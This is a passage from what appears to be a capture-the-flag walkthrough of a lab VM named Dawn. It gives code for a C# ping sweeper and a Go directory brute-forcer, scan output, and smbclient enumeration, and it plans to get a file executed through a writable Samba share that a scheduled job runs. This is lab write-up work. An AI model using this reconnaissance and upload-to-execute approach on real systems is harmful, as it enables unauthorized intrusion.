+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>IPaddress StartIP= <span style="color:#66d9ef">new</span> IPaddress(args[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>IPaddress EndIP= <span style="color:#66d9ef">new</span> IPaddress(args[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>EndIP.increment();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span>(StartIP&lt;EndIP)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ping aPing = <span style="color:#66d9ef">new</span> Ping();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PingReply reply = aPing.Send(StartIP.ToString(), <span style="color:#ae81ff">1000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(reply.Status==IPStatus.Success){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Console.WriteLine(<span style="color:#e6db74">$&#34;response from: {StartIP}&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>StartIP.increment();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Console.WriteLine(<span style="color:#e6db74">&#34;Usage: ping_scan [ first ip address] [last IP address]&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>} }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// We&#39;re not going to check to make sure the value is a valid IP address.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">IPaddress</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span>[] intOctet= <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span>[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// constuctor to split the string by .&#39;s and store the integrer version of stuff into array</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> IPaddress(<span style="color:#66d9ef">string</span> anAddress){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">string</span>[] octets = anAddress.Split(<span style="color:#e6db74">&#39;.&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> res;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i=<span style="color:#ae81ff">0</span>;i &lt;<span style="color:#ae81ff">4</span>;i++){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>res=<span style="color:#66d9ef">int</span>.TryParse(octets[i], <span style="color:#66d9ef">out</span> intOctet[i]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (!res)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Exception(<span style="color:#e6db74">&#34;Not an integer&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// increment function it tries to increment each octet unless its value is 255</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// in that case the next octet is incremented and the previous octets are set to zero</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> increment(){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(intOctet[<span style="color:#ae81ff">3</span>]!=<span style="color:#ae81ff">255</span>){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>intOctet[<span style="color:#ae81ff">3</span>]++;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(intOctet[<span style="color:#ae81ff">2</span>]!= <span style="color:#ae81ff">255</span>){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>intOctet[<span style="color:#ae81ff">2</span>]++;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>intOctet[<span style="color:#ae81ff">3</span>]=<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(intOctet[<span style="color:#ae81ff">1</span>]!= <span style="color:#ae81ff">255</span>){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>intOctet[<span style="color:#ae81ff">1</span>]++;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>intOctet[<span style="color:#ae81ff">3</span>]=<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>intOctet[<span style="color:#ae81ff">2</span>]=<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(intOctet[<span style="color:#ae81ff">0</span>]!= <span style="color:#ae81ff">255</span>){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>intOctet[<span style="color:#ae81ff">0</span>]++;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>intOctet[<span style="color:#ae81ff">3</span>]=<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>intOctet[<span style="color:#ae81ff">2</span>]=<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>intOctet[<span style="color:#ae81ff">1</span>]=<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// just returns Ip in dotted decimal notation</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">override</span> <span style="color:#66d9ef">string</span> ToString(){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> intOctet[<span style="color:#ae81ff">0</span>].ToString()+<span style="color:#e6db74">&#34;.&#34;</span>+ intOctet[<span style="color:#ae81ff">1</span>].ToString()+<span style="color:#e6db74">&#34;.&#34;</span>+intOctet[<span style="color:#ae81ff">2</span>].ToString()+<span style="color:#e6db74">&#34;.&#34;</span>+intOctet[<span style="color:#ae81ff">3</span>].ToString();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// return Str(intOctet[0])+Str(intOctet[1])+Str(intOctet[2])+Str(intOctet[3]);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">bool</span> Equals(IPaddress anIP){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(anIP.ToString()==<span style="color:#66d9ef">this</span>.ToString()){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Overload the &lt; and &gt; operator</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">operator</span> &lt; (IPaddress Ip1,IPaddress Ip2){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(Ip1.intOctet[<span style="color:#ae81ff">0</span>]&lt;Ip2.intOctet[<span style="color:#ae81ff">0</span>]){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (Ip1.intOctet[<span style="color:#ae81ff">1</span>]&lt;Ip2.intOctet[<span style="color:#ae81ff">1</span>]){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (Ip1.intOctet[<span style="color:#ae81ff">2</span>]&lt;Ip2.intOctet[<span style="color:#ae81ff">2</span>]){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (Ip1.intOctet[<span style="color:#ae81ff">3</span>]&lt;Ip2.intOctet[<span style="color:#ae81ff">3</span>]){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Console.WriteLine(Ip1);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Console.WriteLine(Ip2);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">operator</span> &gt; (IPaddress Ip1,IPaddress Ip2){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(Ip1.intOctet[<span style="color:#ae81ff">0</span>]&lt;=Ip2.intOctet[<span style="color:#ae81ff">0</span>]){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (Ip1.intOctet[<span style="color:#ae81ff">1</span>]&lt;=Ip2.intOctet[<span style="color:#ae81ff">1</span>]){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (Ip1.intOctet[<span style="color:#ae81ff">2</span>]&lt;=Ip2.intOctet[<span style="color:#ae81ff">2</span>]){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (Ip1.intOctet[<span style="color:#ae81ff">3</span>]&lt;=Ip2.intOctet[<span style="color:#ae81ff">3</span>]){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Running the ping scanner helps me find the IP address of the VM. I
+could then use that IP address with the port scanning script. The output is included below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python port_scan<span style="color:#f92672">.</span>py  
+</span></span><span style="display:flex;"><span>port <span style="color:#ae81ff">80</span> <span style="color:#f92672">is</span> open  
+</span></span><span style="display:flex;"><span>port <span style="color:#ae81ff">139</span> <span style="color:#f92672">is</span> open  
+</span></span><span style="display:flex;"><span>port <span style="color:#ae81ff">445</span> <span style="color:#f92672">is</span> open  
+</span></span><span style="display:flex;"><span>port <span style="color:#ae81ff">3306</span> <span style="color:#f92672">is</span> open
+</span></span></code></pre></div><p>I made some assumptions about what was running on the machine based on
+the port number. Assuming everything is on default ports, then the
+breakdown of services should be as follows:</p>
+<table>
+<thead>
+<tr>
+<th>port number</th>
+<th>likely service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>80</td>
+<td>web server</td>
+</tr>
+<tr>
+<td>139/445</td>
+<td>Samba</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>sql database</td>
+</tr>
+</tbody>
+</table>
+<p>The first service I explore is the webserver on port 80. I visit it in my web browser. Opening the Ip address in the web browser reveals a
+basic web page.</p>
+
+    <img src="/img/1dawn/construction.png"  alt="Under construction"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>I wish to perform basic enumeration of directories within the website.
+I check if the website has a robots.txt file. This file, if it exists,
+tells search engine bots which parts of the website should and should
+not be indexed. The website does not have a robots.txt file so I must
+use other means to explore the website.</p>
+
+    <img src="/img/1dawn/robot.png"  alt="robots.txt not found"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>This need leads to the creation of a new tool. I want a Web Content
+Scanner. This tool would try to brute force directories on the webserver
+using words in a wordlist. For example, the tool would try to visit
+<a href="http://example.com/word1">http://example.com/word1</a> then
+<a href="http://example.com/word2">http://example.com/word2</a> until all words in the wordlist are
+exhausted. As output, the tool would report which URLs return
+interesting HTTP response codes like 200, 302,301. I wrote the tool in
+GO. The actual implementation is straightforward. See the code below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;flag&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;net/http&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;os&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;log&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;bufio&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;strings&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// variables declaration
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">host</span> <span style="color:#66d9ef">string</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wordlist</span> <span style="color:#66d9ef">string</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// flags declaration using flag package
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">flag</span>.<span style="color:#a6e22e">StringVar</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">host</span>, <span style="color:#e6db74">&#34;h&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;Specify a host to scan.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">flag</span>.<span style="color:#a6e22e">StringVar</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">wordlist</span>, <span style="color:#e6db74">&#34;w&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;Specicify a wordlist to use&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// flag.Var(&amp;host, &#34;h&#34;, &#34;Specify a host to scan.&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// flag.Var(&amp;wordlist, &#34;w&#34;, &#34;Specicify a wordlist to use&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">flag</span>.<span style="color:#a6e22e">Parse</span>() <span style="color:#75715e">// after declaring flags we need to call it
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(!(<span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">HasSuffix</span>(<span style="color:#a6e22e">host</span>,<span style="color:#e6db74">&#34;/&#34;</span>))){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">host</span>=<span style="color:#a6e22e">host</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">file</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Open</span>(<span style="color:#a6e22e">wordlist</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">file</span>.<span style="color:#a6e22e">Close</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">scanner</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">bufio</span>.<span style="color:#a6e22e">NewScanner</span>(<span style="color:#a6e22e">file</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">scanner</span>.<span style="color:#a6e22e">Scan</span>(){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">resp</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span><span style="color:#a6e22e">scanner</span>.<span style="color:#a6e22e">Text</span>())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">StatusCode</span><span style="color:#f92672">==</span><span style="color:#ae81ff">200</span> <span style="color:#f92672">||</span><span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">StatusCode</span> <span style="color:#f92672">==</span><span style="color:#ae81ff">301</span><span style="color:#f92672">||</span><span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">StatusCode</span><span style="color:#f92672">==</span><span style="color:#ae81ff">302</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span><span style="color:#a6e22e">scanner</span>.<span style="color:#a6e22e">Text</span>())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// fmt.Println(host +scanner.Text())
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">scanner</span>.<span style="color:#a6e22e">Err</span>(); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span><span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Running the tool results in this output.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    $ go run directory_scanner.go -h http://192.168.126.11/ -w common.txt
+</span></span><span style="display:flex;"><span>    http://192.168.126.11/
+</span></span><span style="display:flex;"><span>    http://192.168.126.11/index.html
+</span></span><span style="display:flex;"><span>    http://192.168.126.11/logs
+</span></span></code></pre></div><p>The logs directory looks interesting. I visit this URL in my web
+browser, and the webpage displays several files. I download the only
+file that is not empty.</p>
+
+    <img src="/img/1dawn/log.png"  alt="management log"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>The file contains a large number of logs. The logs are a bit too dense
+to read manually. I use the find tool in kwrite to look for evidence of
+files being run. I discovered a log that indicates a file was being run
+in the ITDEPT folder of a user named dawn. If we could upload a file
+with the same name to the folder there is a chance it would be run.
+Luckily earlier, we noted that ports associated with samba share were
+open on the machine. A samba share seems like a viable means of
+uploading files to the machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2020/08/12 09:50:01 <span style="color:#f92672">[</span>31;1mCMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> PID<span style="color:#f92672">=</span><span style="color:#ae81ff">1880</span>   | /bin/sh -c /home/dawn/ITDEPT/product-control <span style="color:#f92672">[</span>0m
+</span></span></code></pre></div><p>I use smbclient to see which shares were open on the machine. The ITDEPT share looks like it is related to the folder we want access to.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>     ~ <span style="color:#f92672">[</span>SIGINT<span style="color:#f92672">]</span>&gt; smbclient -L //192.168.1.165/  
+</span></span><span style="display:flex;"><span>    Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t load /etc/samba/smb.conf - run testparm to debug it  
+</span></span><span style="display:flex;"><span>    Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\s</span>pook2<span style="color:#f92672">]</span>:  
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>           Sharename       Type      Comment  
+</span></span><span style="display:flex;"><span>           ---------       ----      -------  
+</span></span><span style="display:flex;"><span>           print$          Disk      Printer Drivers  
+</span></span><span style="display:flex;"><span>           ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.  
